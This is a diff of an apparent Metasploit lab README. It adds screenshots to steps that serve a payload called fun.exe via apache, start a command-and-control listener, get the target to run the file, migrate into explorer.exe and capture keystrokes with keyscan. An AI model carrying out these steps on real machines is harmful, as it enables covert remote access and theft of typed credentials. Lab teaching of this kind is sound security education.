@@ -43,23 +43,26 @@ copy the fun.exe into the apache /var/www/html folder
 Start apache server
 sudo systemctl apache2 start
 ## OUTPUT:
+<img width="812" height="52" alt="image" src="https://github.com/user-attachments/assets/007c965e-d499-4eae-a6ff-dcc733e243f2" />
 
-<img width="941" height="400" alt="image" src="https://github.com/user-attachments/assets/598fb6fb-9b2c-4279-8703-83351dd24d56" />
+
 
 Check the status of apache2
 ## OUTPUT:
 
-
+<img width="941" height="400" alt="image" src="https://github.com/user-attachments/assets/598fb6fb-9b2c-4279-8703-83351dd24d56" />
 
 Invoke msfconsole:
 ## OUTPUT:
 
 
+<img width="913" height="540" alt="image" src="https://github.com/user-attachments/assets/3b0914ed-d60f-47b9-8332-ffb96a57ef7f" />
 
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 ## OUTPUT:
 
+<img width="925" height="971" alt="image" src="https://github.com/user-attachments/assets/01fe64e8-0be7-46c3-9384-682a05596784" />
 
 
 Starting a command and control Server
@@ -69,6 +72,7 @@ set LHOST 0.0.0.0
 
 ## OUTPUT:
 
+<img width="716" height="702" alt="image" src="https://github.com/user-attachments/assets/82be4a8d-9fd0-429a-9802-cf331380a2d5" />
 
 
 
@@ -87,12 +91,14 @@ Bypass any warning boxes, double-click the file, and allow it to run.
 On kali/parrot give the command exploit
 ## OUTPUT:
 
+<img width="447" height="110" alt="image" src="https://github.com/user-attachments/assets/c3fdb931-d189-431e-9f16-2c75d34f5f3a" />
 
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
 ## OUTPUT:
 
+<img width="466" height="120" alt="image" src="https://github.com/user-attachments/assets/be5f0d85-89cb-44ec-a17a-a26b7e8e2d36" />
 
 
 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
@@ -102,6 +108,7 @@ At the meterpreter > prompt, execute this command:
 
 migrate -N explorer.exe
 ## OUTPUT:
+<img width="703" height="672" alt="image" src="https://github.com/user-attachments/assets/192ca3c7-f9d0-44e7-ad71-3eff1fc57aa3" />
 
 
 at meterpreter > prompt, execute this command:
@@ -120,8 +127,10 @@ keyscan_start	Begins capturing keys typed in the target. On the Windows target, 
 
 
 
+
 keyscan_dump	Shows the keystrokes captured so far
 ## OUTPUT:
+
 
 
 ## RESULT:
